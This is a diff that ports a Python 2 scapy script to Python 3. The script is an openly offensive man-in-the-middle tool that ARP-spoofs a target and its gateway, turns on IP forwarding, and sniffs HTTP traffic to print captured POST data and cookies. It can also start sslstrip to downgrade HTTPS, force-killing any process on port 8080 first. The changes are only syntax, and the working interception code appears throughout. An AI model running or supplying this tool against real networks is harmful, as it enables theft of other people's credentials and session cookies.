@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 import os
@@ -12,8 +12,8 @@ from scapy.all import sniff, Raw, ARP, Ether, send, srp
 def enable_ip_forwarding(enable=True):
     path = "/proc/sys/net/ipv4/ip_forward"
     with open(path, "wb") as f:
-        f.write("1\n" if enable else "0\n")
-    print "[+] IP forwarding {}".format("enabled" if enable else "disabled")
+        f.write(b"1\n" if enable else b"0\n")
+    print("[+] IP forwarding {}".format("enabled" if enable else "disabled"))
 
 def restore_network(target_ip, gateway_ip):
     target_mac = get_mac(target_ip)
@@ -21,7 +21,7 @@ def restore_network(target_ip, gateway_ip):
     if target_mac and gateway_mac:
         send(ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
         send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)
-    print "\n[+] Restored network. Exiting..."
+    print("\n[+] Restored network. Exiting...")
 
 def get_mac(ip):
     answered, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
@@ -33,10 +33,10 @@ def arp_spoof(target_ip, gateway_ip):
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
     if not target_mac or not gateway_mac:
-        print "[-] Could not get MAC addresses. Exiting..."
+        print("[-] Could not get MAC addresses. Exiting...")
         sys.exit(1)
 
-    print "[+] Spoofing {} -> {}".format(target_ip, gateway_ip)
+    print("[+] Spoofing {} -> {}".format(target_ip, gateway_ip))
     try:
         while True:
             send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
@@ -53,24 +53,24 @@ def packet_callback(packet):
             cookies = re.findall(r"Cookie: (.+)", payload)
 
             if post_data:
-                print "\n" + "=" * 50
-                print "[+] HTTP POST Data Captured:"
-                print "-" * 50
-                print post_data[0]
+                print("\n" + "=" * 50)
+                print("[+] HTTP POST Data Captured:")
+                print("-" * 50)
+                print(post_data[0])
                 
                 if cookies:
-                    print "-" * 50
-                    print "[+] Captured Cookies:"
+                    print("-" * 50)
+                    print("[+] Captured Cookies:")
                     for cookie in cookies:
-                        print cookie
+                        print(cookie)
                 
-                print "=" * 50 + "\n"
+                print("=" * 50 + "\n")
 
     except Exception as e:
-        print "[-] Error:", e
+        print("[-] Error:", e)
 
 def start_sniffing(interface):
-    print "[+] Sniffing on {}...".format(interface)
+    print("[+] Sniffing on {}...".format(interface))
     sniff(iface=interface, prn=packet_callback, store=0)
 
 def kill_process_on_port(port):
@@ -79,11 +79,11 @@ def kill_process_on_port(port):
         pid = [line.split()[-1].split('/')[0] for line in output.split('\n') if line][0]
         
         if pid.isdigit():
-            print "[+] Port {} is in use by process {}. Terminating...".format(port, pid)
+            print("[+] Port {} is in use by process {}. Terminating...".format(port, pid))
             os.system("sudo kill -9 {}".format(pid))
-            print "[+] Port {} is now free.".format(port)
+            print("[+] Port {} is now free.".format(port))
     except:
-        print "[+] Port {} is free.".format(port)
+        print("[+] Port {} is free.".format(port))
 
 def show_help():
     help_text = """
@@ -110,7 +110,7 @@ Examples:
 Options:
   -h, --help      Show this help message and exit.
 """
-    print help_text
+    print(help_text)
     sys.exit(0)
 
 def main():
@@ -118,7 +118,7 @@ def main():
         show_help()
 
     if len(sys.argv) != 5 or sys.argv[1] != "-i":
-        print "Usage: python scapy_script.py  -i <interface> <target_ip/network> <gateway_ip>"
+        print("Usage: python scapy_script.py  -i <interface> <target_ip/network> <gateway_ip>")
         sys.exit(1)
 
     interface = sys.argv[2]
@@ -126,17 +126,17 @@ def main():
     gateway_ip = sys.argv[4]
 
     while True:
-        sniff_https = raw_input("[?] Capture HTTPS traffic as well? (yes/y or no/n): ").strip().lower()
+        sniff_https = input("[?] Capture HTTPS traffic as well? (yes/y or no/n): ").strip().lower()
         if sniff_https in ["y", "yes"]:
-            print "[+] HTTPS sniffing enabled (requires SSLstrip)"
+            print("[+] HTTPS sniffing enabled (requires SSLstrip)")
             kill_process_on_port(8080)
             os.system("sslstrip -k -l 8080 &")
             break
         elif sniff_https in ["n", "no"]:
-            print "[+] HTTPS sniffing disabled"
+            print("[+] HTTPS sniffing disabled")
             break
         else:
-            print "[-] Invalid input. Please enter 'yes/y' or 'no/n'."
+            print("[-] Invalid input. Please enter 'yes/y' or 'no/n'.")
 
     enable_ip_forwarding(True)
 
@@ -151,4 +151,3 @@ signal.signal(signal.SIGINT, signal_handler)
 
 if __name__ == "__main__":
     main()
-
